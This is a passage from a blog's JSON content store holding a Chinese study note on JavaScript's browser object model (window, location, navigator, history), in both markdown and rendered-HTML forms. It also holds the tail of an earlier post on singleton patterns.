Person(<span class=\"string\">\"Nicholas\"</span>);</span><br><span class=\"line\">alert(person1.getName()); <span class=\"comment\">//\"Nicholas\"</span></span><br><span class=\"line\">person1.setName(<span class=\"string\">\"Greg\"</span>);</span><br><span class=\"line\">alert(person1.getName()); <span class=\"comment\">//\"Greg\"</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Michael\"</span>);</span><br><span class=\"line\">alert(person1.getName()); <span class=\"comment\">//\"Michael\"</span></span><br><span class=\"line\">alert(person2.getName()); <span class=\"comment\">//\"Michael\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"单例模式（模块模式）\"><a href=\"#单例模式（模块模式）\" class=\"headerlink\" title=\"单例模式（模块模式）\"></a>单例模式（模块模式）</h2><p>普通方式<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> singleton = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//私有变量和私有函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> privateVariable = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateFunction</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//特权/公有方法和属性</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    publicProperty: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    publicMethod: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      privateVariable++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> privateFunction();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure></p>\n<p>增强方式（适合那些单例必须是某种类型的实例）<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> singleton = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//私有变量和私有函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> privateVariable = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateFunction</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//创建对象</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> object = <span class=\"keyword\">new</span> CustomType();</span><br><span class=\"line\">  <span class=\"comment\">//添加特权/公有属性和方法</span></span><br><span class=\"line\">  object.publicProperty = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  object.publicMethod = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    privateVariable++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> privateFunction();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//返回这个对象</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> object;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure></p>"},{"title":"BOM（《JavaScript高级程序设计》）","date":"2019-01-10T09:47:16.000Z","updated":"2019-01-10T09:47:16.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\nBOM（浏览器对象模型），理解window对象，重点掌握location对象和navigator对象的使用。\n<!-- more -->\n\n# 详述\n\n## window 对象\n\n双重角色，既是 JavaScript 访问浏览器窗口的接口，又是 ECMAScript 规定的 Global 对象。\n\n### 页面视口大小\n\n```js\n// 兼容写法\nvar pageWidth = window.innerWidth,\n  pageHeight = window.innerHeight;\nif (typeof pageWidth != \"number\") {\n  if (document.compatMode == \"CSS1Compat\") {\n    pageWidth = document.documentElement.clientWidth;\n    pageHeight = document.documentElement.clientHeight;\n  } else {\n    pageWidth = document.body.clientWidth;\n    pageHeight = document.body.clientHeight;\n  }\n}\n```\n\n### 窗口关系及框架\n\n```html\n<html>\n    <head>\n        <title>Frameset Example</title>\n    </head>\n    <frameset rows=\"160,*\">\n        <frame src=\"frame.htm\" name=\"topFrame\">\n        <frameset cols=\"50%,50%\">\n            <frame src=\"anotherframe.htm\" name=\"leftFrame\">\n            <frame src=\"yetanotherframe.htm\" name=\"rightFrame\">\n        </frameset>\n    </frameset>\n</html>\n```\n\n常用属性及方法：`window.frames`,`window.self`,`window.top`,`window.parent`,`window.open()`\n\n### 打开窗口\n\n```js\nvar blocked = false;\ntry {\n  var wroxWin = window.open(\"http://www.wrox.com\", \"_blank\");\n  if (wroxWin == null) {\n    blocked = true;\n  }\n} catch (ex) {\n  blocked = true;\n}\nif (blocked) {\n  alert(\"The popup was blocked!\");\n}\n```\n\n### 超时调用 setTimeout()\n\n两个参数：要执行的代码和以毫秒表示的时间。\n\n第一个参数可以是字符串，可以是函数名，可以是匿名函数体，不推荐字符串写法。\n\n第二个参数告诉 JavaScript 再过多长时间把当前任务添加到队列中。如果队列是空的，那么添加的代码会立即\n执行；如果队列不是空的，那么它就要等前面的代码执行完了以后再执行。注意，不要理解成过多长时间执行任务！\n\n取消超时调用：`clearTimeout()`。\n\n```js\n//推荐的调用方式\nvar timeoutId = setTimeout(function() {\n  alert(\"Hello world!\");\n}, 1000);\n//取消\nclearTimeout(timeoutId);\n```\n\n### 间歇调用 setInterval()\n\n语法同 setTimeout()。\n\n取消间歇调用：`clearTimeout()`。\n\n实现间歇调用，一般不直接用 setInterval，而是用 setTimeout 实现，如下：\n\n```js\nvar num = 0;\nvar max = 10;\nfunction incrementNumber() {\n  num++;\n  //如果执行次数未达到max 设定的值，则设置另一次超时调用\n  if (num < max) {\n    setTimeout(incrementNumber, 500);\n  } else {\n    alert(\"Done\");\n  }\n}\nsetTimeout(incrementNumber, 500);\n```\n\n关于 setTimeout 与 setInterval 的进一步分析，请看另外一篇[定时器详解](/2018/04/09/JS%E5%8A%A8%E7%94%BB%E4%B9%8B%E5%AE%9A%E6%97%B6%E5%99%A8%E8%AF%A6%E8%A7%A3/)\n\n### 系统对话框\n\n`alert(),onfirm(),prompt(),print(),find()`\n\n## location 对象\n\nwindow.location 和 document.location 引用的是同一个对象。\n\nlocation 对象的所有属性: `hash,host,hostname,href,pathname,port,protocol,search`。\n\n### 查询字符串参数\n\n```js\nfunction getQueryStringArgs() {\n  //取得查询字符串并去掉开头的问号\n  var qs = location.search.length > 0 ? location.search.substring(1) : \"\",\n    //保存数据的对象\n    args = {},\n    //取得每一项\n    items = qs.length ? qs.split(\"&\") : [],\n    item = null,\n    name = null,\n    value = null,\n    //在for 循环中使用\n    i = 0,\n    len = items.length;\n  //逐个将每一项添加到args 对象中\n  for (i = 0; i < len; i++) {\n    item = items[i].split(\"=\");\n    name = decodeURIComponent(item[0]);\n    value = decodeURIComponent(item[1]);\n    if (name.length) {\n      args[name] = value;\n    }\n  }\n  return args;\n}\n```\n\n### 位置操作\n\n导航到 URL，会生成历史记录，可以后退。\n\n```js\n// 三种方式等价\nlocation.assign(\"http://www.wrox.com\");\nwindow.location = \"http://www.wrox.com\";\nlocation.href = \"http://www.wrox.com\";\n\n// 直接修改属性值也可以\n//假设初始URL 为http://www.wrox.com/WileyCDA/\n//将URL 修改为\"http://www.wrox.com/WileyCDA/#section1\"\nlocation.hash = \"#section1\";\n//将URL 修改为\"http://www.wrox.com/WileyCDA/?q=javascript\"\nlocation.search = \"?q=javascript\";\n//将URL 修改为\"http://www.yahoo.com/WileyCDA/\"\nlocation.hostname = \"www.yahoo.com\";\n//将URL 修改为\"http://www.yahoo.com/mydir/\"\nlocation.pathname = \"mydir\";\n//将URL 修改为\"http://www.yahoo.com:8080/WileyCDA/\"\nlocation.port = 8080;\n```\n\n导航到 URL，不会生成历史记录，无法后退。\n\n```js\nlocation.replace(\"http://www.wrox.com/\");\n```\n\n重新加载当前显示的页面。\n\n```js\nlocation.reload(); //重新加载（有可能从缓存中加载）\nlocation.reload(true); //重新加载（从服务器重新加载）\n```\n\n## navigator 对象\n\n用于识别客户端浏览器\n\n### 检测插件\n\n```js\n//检测插件（在IE 中无效）\nfunction hasPlugin(name) {\n  name = name.toLowerCase();\n  for (var i = 0; i < navigator.plugins.length; i++) {\n    if (navigator.plugins[i].name.toLowerCase().indexOf(name) > -1) {\n      return true;\n    }\n  }\n  return false;\n}\n//检测Flash\nalert(hasPlugin(\"Flash\"));\n//检测QuickTime\nalert(hasPlugin(\"QuickTime\"));\n\n//检测IE 中的插件\nfunction hasIEPlugin(name) {\n  try {\n    new ActiveXObject(name);\n    return true;\n  } catch (ex) {\n    return false;\n  }\n}\n//检测Flash\nalert(hasIEPlugin(\"ShockwaveFlash.ShockwaveFlash\"));\n//检测QuickTime\nalert(hasIEPlugin(\"QuickTime.QuickTime\"));\n\n//检测所有浏览器中的Flash\nfunction hasFlash() {\n  var result = hasPlugin(\"Flash\");\n  if (!result) {\n    result = hasIEPlugin(\"ShockwaveFlash.ShockwaveFlash\");\n  }\n  return result;\n}\n//检测所有浏览器中的QuickTime\nfunction hasQuickTime() {\n  var result = hasPlugin(\"QuickTime\");\n  if (!result) {\n    result = hasIEPlugin(\"QuickTime.QuickTime\");\n  }\n  return result;\n}\n//检测Flash\nalert(hasFlash());\n//检测QuickTime\nalert(hasQuickTime());\n```\n### 注册处理程序\n```js\nnavigator.registerContentHandler(\"application/rss+xml\", \"http://www.somereader.com?feed=%s\", \"Some Reader\");\n\nnavigator.registerProtocolHandler(\"mailto\", \"http://www.somemailclient.com?cmd=%s\", \"Some Mail Client\");\n```\n\n\n## screen 对象\n保存着与客户端显示器有关的信息，这些信息一般只用于站点分析。\n\n\n## history 对象\n\n判断历史记录的数量`history.length`\n```js\nif (history.length == 0){\n//这应该是用户打开窗口后的第一个页面\n}\n```\n\n向后或向前导航到任意页面`go(),back(),forward()`\n```js\n//后退一页\nhistory.go(-1);\n//前进一页\nhistory.go(1);\n//前进两页\nhistory.go(2);\n\n//跳转到最近的wrox.com 页面\nhistory.go(\"wrox.com\");\n//跳转到最近的nczonline.net 页面\nhistory.go(\"nczonline.net\");\n\n//后退一页\nhistory.back();\n//前进一页\nhistory.forward();\n```","source":"_posts/2019/01/2019-01-10-JS高设3版-8.md","raw":"---\ntitle: BOM（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2019-01-10 17:47:16\nupdated: 2019-01-10 17:47:16\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\nBOM（浏览器对象模型），理解window对象，重点掌握location对象和navigator对象的使用。\n<!-- more -->\n\n# 详述\n\n## window 对象\n\n双重角色，既是 JavaScript 访问浏览器窗口的接口，又是 ECMAScript 规定的 Global 对象。\n\n### 页面视口大小\n\n```js\n// 兼容写法\nvar pageWidth = window.innerWidth,\n  pageHeight = window.innerHeight;\nif (typeof pageWidth != \"number\") {\n  if (document.compatMode == \"CSS1Compat\") {\n    pageWidth = document.documentElement.clientWidth;\n    pageHeight = document.documentElement.clientHeight;\n  } else {\n    pageWidth = document.body.clientWidth;\n    pageHeight = document.body.clientHeight;\n  }\n}\n```\n\n### 窗口关系及框架\n\n```html\n<html>\n    <head>\n        <title>Frameset Example</title>\n    </head>\n    <frameset rows=\"160,*\">\n        <frame src=\"frame.htm\" name=\"topFrame\">\n        <frameset cols=\"50%,50%\">\n            <frame src=\"anotherframe.htm\" name=\"leftFrame\">\n            <frame src=\"yetanotherframe.htm\" name=\"rightFrame\">\n        </frameset>\n    </frameset>\n</html>\n```\n\n常用属性及方法：`window.frames`,`window.self`,`window.top`,`window.parent`,`window.open()`\n\n### 打开窗口\n\n```js\nvar blocked = false;\ntry {\n  var wroxWin = window.open(\"http://www.wrox.com\", \"_blank\");\n  if (wroxWin == null) {\n    blocked = true;\n  }\n} catch (ex) {\n  blocked = true;\n}\nif (blocked) {\n  alert(\"The popup was blocked!\");\n}\n```\n\n### 超时调用 setTimeout()\n\n两个参数：要执行的代码和以毫秒表示的时间。\n\n第一个参数可以是字符串，可以是函数名，可以是匿名函数体，不推荐字符串写法。\n\n第二个参数告诉 JavaScript 再过多长时间把当前任务添加到队列中。如果队列是空的，那么添加的代码会立即\n执行；如果队列不是空的，那么它就要等前面的代码执行完了以后再执行。注意，不要理解成过多长时间执行任务！\n\n取消超时调用：`clearTimeout()`。\n\n```js\n//推荐的调用方式\nvar timeoutId = setTimeout(function() {\n  alert(\"Hello world!\");\n}, 1000);\n//取消\nclearTimeout(timeoutId);\n```\n\n### 间歇调用 setInterval()\n\n语法同 setTimeout()。\n\n取消间歇调用：`clearTimeout()`。\n\n实现间歇调用，一般不直接用 setInterval，而是用 setTimeout 实现，如下：\n\n```js\nvar num = 0;\nvar max = 10;\nfunction incrementNumber() {\n  num++;\n  //如果执行次数未达到max 设定的值，则设置另一次超时调用\n  if (num < max) {\n    setTimeout(incrementNumber, 500);\n  } else {\n    alert(\"Done\");\n  }\n}\nsetTimeout(incrementNumber, 500);\n```\n\n关于 setTimeout 与 setInterval 的进一步分析，请看另外一篇[定时器详解](/2018/04/09/JS%E5%8A%A8%E7%94%BB%E4%B9%8B%E5%AE%9A%E6%97%B6%E5%99%A8%E8%AF%A6%E8%A7%A3/)\n\n### 系统对话框\n\n`alert(),onfirm(),prompt(),print(),find()`\n\n## location 对象\n\nwindow.location 和 document.location 引用的是同一个对象。\n\nlocation 对象的所有属性: `hash,host,hostname,href,pathname,port,protocol,search`。\n\n### 查询字符串参数\n\n```js\nfunction getQueryStringArgs() {\n  //取得查询字符串并去掉开头的问号\n  var qs = location.search.length > 0 ? location.search.substring(1) : \"\",\n    //保存数据的对象\n    args = {},\n    //取得每一项\n    items = qs.length ? qs.split(\"&\") : [],\n    item = null,\n    name = null,\n    value = null,\n    //在for 循环中使用\n    i = 0,\n    len = items.length;\n  //逐个将每一项添加到args 对象中\n  for (i = 0; i < len; i++) {\n    item = items[i].split(\"=\");\n    name = decodeURIComponent(item[0]);\n    value = decodeURIComponent(item[1]);\n    if (name.length) {\n      args[name] = value;\n    }\n  }\n  return args;\n}\n```\n\n### 位置操作\n\n导航到 URL，会生成历史记录，可以后退。\n\n```js\n// 三种方式等价\nlocation.assign(\"http://www.wrox.com\");\nwindow.location = \"http://www.wrox.com\";\nlocation.href = \"http://www.wrox.com\";\n\n// 直接修改属性值也可以\n//假设初始URL 为http://www.wrox.com/WileyCDA/\n//将URL 修改为\"http://www.wrox.com/WileyCDA/#section1\"\nlocation.hash = \"#section1\";\n//将URL 修改为\"http://www.wrox.com/WileyCDA/?q=javascript\"\nlocation.search = \"?q=javascript\";\n//将URL 修改为\"http://www.yahoo.com/WileyCDA/\"\nlocation.hostname = \"www.yahoo.com\";\n//将URL 修改为\"http://www.yahoo.com/mydir/\"\nlocation.pathname = \"mydir\";\n//将URL 修改为\"http://www.yahoo.com:8080/WileyCDA/\"\nlocation.port = 8080;\n```\n\n导航到 URL，不会生成历史记录，无法后退。\n\n```js\nlocation.replace(\"http://www.wrox.com/\");\n```\n\n重新加载当前显示的页面。\n\n```js\nlocation.reload(); //重新加载（有可能从缓存中加载）\nlocation.reload(true); //重新加载（从服务器重新加载）\n```\n\n## navigator 对象\n\n用于识别客户端浏览器\n\n### 检测插件\n\n```js\n//检测插件（在IE 中无效）\nfunction hasPlugin(name) {\n  name = name.toLowerCase();\n  for (var i = 0; i < navigator.plugins.length; i++) {\n    if (navigator.plugins[i].name.toLowerCase().indexOf(name) > -1) {\n      return true;\n    }\n  }\n  return false;\n}\n//检测Flash\nalert(hasPlugin(\"Flash\"));\n//检测QuickTime\nalert(hasPlugin(\"QuickTime\"));\n\n//检测IE 中的插件\nfunction hasIEPlugin(name) {\n  try {\n    new ActiveXObject(name);\n    return true;\n  } catch (ex) {\n    return false;\n  }\n}\n//检测Flash\nalert(hasIEPlugin(\"ShockwaveFlash.ShockwaveFlash\"));\n//检测QuickTime\nalert(hasIEPlugin(\"QuickTime.QuickTime\"));\n\n//检测所有浏览器中的Flash\nfunction hasFlash() {\n  var result = hasPlugin(\"Flash\");\n  if (!result) {\n    result = hasIEPlugin(\"ShockwaveFlash.ShockwaveFlash\");\n  }\n  return result;\n}\n//检测所有浏览器中的QuickTime\nfunction hasQuickTime() {\n  var result = hasPlugin(\"QuickTime\");\n  if (!result) {\n    result = hasIEPlugin(\"QuickTime.QuickTime\");\n  }\n  return result;\n}\n//检测Flash\nalert(hasFlash());\n//检测QuickTime\nalert(hasQuickTime());\n```\n### 注册处理程序\n```js\nnavigator.registerContentHandler(\"application/rss+xml\", \"http://www.somereader.com?feed=%s\", \"Some Reader\");\n\nnavigator.registerProtocolHandler(\"mailto\", \"http://www.somemailclient.com?cmd=%s\", \"Some Mail Client\");\n```\n\n\n## screen 对象\n保存着与客户端显示器有关的信息，这些信息一般只用于站点分析。\n\n\n## history 对象\n\n判断历史记录的数量`history.length`\n```js\nif (history.length == 0){\n//这应该是用户打开窗口后的第一个页面\n}\n```\n\n向后或向前导航到任意页面`go(),back(),forward()`\n```js\n//后退一页\nhistory.go(-1);\n//前进一页\nhistory.go(1);\n//前进两页\nhistory.go(2);\n\n//跳转到最近的wrox.com 页面\nhistory.go(\"wrox.com\");\n//跳转到最近的nczonline.net 页面\nhistory.go(\"nczonline.net\");\n\n//后退一页\nhistory.back();\n//前进一页\nhistory.forward();\n```","slug":"2019-01-10-JS高设3版-8","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8wm004fwovv0w414xda","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>BOM（浏览器对象模型），理解window对象，重点掌握location对象和navigator对象的使用。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"window-对象\"><a href=\"#window-对象\" class=\"headerlink\" title=\"window 对象\"></a>window 对象</h2><p>双重角色，既是 JavaScript 访问浏览器窗口的接口，又是 ECMAScript 规定的 Global 对象。</p>\n<h3 id=\"页面视口大小\"><a href=\"#页面视口大小\" class=\"headerlink\" title=\"页面视口大小\"></a>页面视口大小</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 兼容写法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> pageWidth = <span class=\"built_in\">window</span>.innerWidth,</span><br><span class=\"line\">  pageHeight = <span class=\"built_in\">window</span>.innerHeight;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> pageWidth != <span class=\"string\">\"number\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.compatMode == <span class=\"string\">\"CSS1Compat\"</span>) &#123;</span><br><span class=\"line\">    pageWidth = <span class=\"built_in\">document</span>.documentElement.clientWidth;</span><br><span class=\"line\">    pageHeight = <span class=\"built_in\">document</span>.documentElement.clientHeight;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    pageWidth = <span class=\"built_in\">document</span>.body.clientWidth;</span><br><span class=\"line\">    pageHeight = <span class=\"built_in\">document</span>.body.clientHeight;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"窗口关系及框架\"><a href=\"#窗口关系及框架\" class=\"headerlink\" title=\"窗口关系及框架\"></a>窗口关系及框架</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Frameset Example<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">frameset</span> <span class=\"attr\">rows</span>=<span class=\"string\">\"160,*\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">frame</span> <span class=\"attr\">src</span>=<span class=\"string\">\"frame.htm\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"topFrame\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">frameset</span> <span class=\"attr\">cols</span>=<span class=\"string\">\"50%,50%\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">frame</span> <span class=\"attr\">src</span>=<span class=\"string\">\"anotherframe.htm\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"leftFrame\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">frame</span> <span class=\"attr\">src</span>=<span class=\"string\">\"yetanotherframe.htm\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"rightFrame\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">frameset</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">frameset</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>常用属性及方法：<code>window.frames</code>,<code>window.self</code>,<code>window.top</code>,<code>window.parent</code>,<code>window.open()</code></p>\n<h3 id=\"打开窗口\"><a href=\"#打开窗口\" class=\"headerlink\" title=\"打开窗口\"></a>打开窗口</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> blocked = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> wroxWin = <span class=\"built_in\">window</span>.open(<span class=\"string\">\"http://www.wrox.com\"</span>, <span class=\"string\">\"_blank\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (wroxWin == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    blocked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">  blocked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (blocked) &#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"The popup was blocked!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"超时调用-setTimeout\"><a href=\"#超时调用-setTimeout\" class=\"headerlink\" title=\"超时调用 setTimeout()\"></a>超时调用 setTimeout()</h3><p>两个参数：要执行的代码和以毫秒表示的时间。</p>\n<p>第一个参数可以是字符串，可以是函数名，可以是匿名函数体，不推荐字符串写法。</p>\n<p>第二个参数告诉 JavaScript 再过多长时间把当前任务添加到队列中。如果队列是空的，那么添加的代码会立即<br>执行；如果队列不是空的，那么它就要等前面的代码执行完了以后再执行。注意，不要理解成过多长时间执行任务！</p>\n<p>取消超时调用：<code>clearTimeout()</code>。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//推荐的调用方式</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeoutId = setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"Hello world!\"</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\"><span class=\"comment\">//取消</span></span><br><span class=\"line\">clearTimeout(timeoutId);</span><br></pre></td></tr></table></figure>\n<h3 id=\"间歇调用-setInterval\"><a href=\"#间歇调用-setInterval\" class=\"headerlink\" title=\"间歇调用 setInterval()\"></a>间歇调用 setInterval()</h3><p>语法同 setTimeout()。</p>\n<p>取消间歇调用：<code>clearTimeout()</code>。</p>\n<p>实现间歇调用，一般不直接用 setInterval，而是用 setTimeout 实现，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> num = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> max = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">incrementNumber</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  num++;</span><br><span class=\"line\">  <span class=\"comment\">//如果执行次数未达到max 设定的值，则设置另一次超时调用</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (num &lt; max) &#123;</span><br><span class=\"line\">    setTimeout(incrementNumber, <span class=\"number\">500</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    alert(<span class=\"string\">\"Done\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">setTimeout(incrementNumber, <span class=\"number\">500</span>);</span><br></pre></td></tr></table></figure>\n<p>关于 setTimeout 与 setInterval 的进一步分析，请看另外一篇<a href=\"/2018/04/09/JS%E5%8A%A8%E7%94%BB%E4%B9%8B%E5%AE%9A%E6%97%B6%E5%99%A8%E8%AF%A6%E8%A7%A3/\">定时器详解</a></p>\n<h3 id=\"系统对话框\"><a href=\"#系统对话框\" class=\"headerlink\" title=\"系统对话框\"></a>系统对话框</h3><p><code>alert(),onfirm(),prompt(),print(),find()</code></p>\n<h2 id=\"location-对象\"><a href=\"#location-对象\" class=\"headerlink\" title=\"location 对象\"></a>location 对象</h2><p>window.location 和 document.location 引用的是同一个对象。</p>\n<p>location 对象的所有属性: <code>hash,host,hostname,href,pathname,port,protocol,search</code>。</p>\n<h3 id=\"查询字符串参数\"><a href=\"#查询字符串参数\" class=\"headerlink\" title=\"查询字符串参数\"></a>查询字符串参数</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 